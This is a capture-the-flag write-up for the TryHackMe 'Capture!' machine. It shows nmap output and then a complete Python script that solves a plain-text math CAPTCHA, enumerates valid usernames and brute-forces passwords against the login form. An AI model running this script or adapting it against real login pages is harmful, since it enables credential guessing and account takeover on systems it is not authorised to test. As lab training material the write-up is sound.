---
title: Capture!
description: Writeup for the TryHackMe machine Capture!
date: 2023-05-05
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds one open port: HTTP (80).
```
80/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
```

## Bypass the login form

The web server redirects to a login form at `/login`.

Submitting the username `admin` returns the error:
```
The user 'admin' does not exist
```
This suggests that username enumeration is possible.

After submitting a few different usernames, a CAPTCHA appears. The CAPTCHA is plain text, making it easy to extract and solve the equation programmatically.

I write a script to enumerate valid usernames and brute-force the password of each discovered user:
```python
import requests
import sys
import re

def solve_captcha(text):
    if "Captcha enabled" in text:
        match = re.search(r"(\d+ [\+\*\-] \d+) =", text)
        if match:
            return eval(match.group(1))

if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} <ip>")
    
ip = sys.argv[1]

with open("usernames.txt") as f:
    usernames = f.read().splitlines()
with open("passwords.txt") as f:
    passwords = f.read().splitlines()
    
response = requests.post(f"http://{ip}/login", data={"username": "test", "password": "test"})
captcha = solve_captcha(response.text)
    
valid_usernames = []
for username in usernames:
    response = requests.post(f"http://{ip}/login", data={"username": username, "password": "test", "captcha": captcha})
    if "does not exist" in response.text:
        print(f"[-] Invalid username: {username}")
    else:
        print(f"[+] Username found: {username}")
        valid_usernames.append(username)
    captcha = solve_captcha(response.text)

credentails = []
for username in valid_usernames:
    for password in passwords:
        response = requests.post(f"http://{ip}/login", data={"username": username, "password": password, "captcha": captcha})
        if "Invalid password for user" in response.text:
            print(f"[-] Invalid password: {username}:{password}")
        else:
            print(f"[+] Password found: {username}:{password}")
            credentails.append(f"{username}:{password}")
        captcha = solve_captcha(response.text)
        
print(",".join(credentails))
```
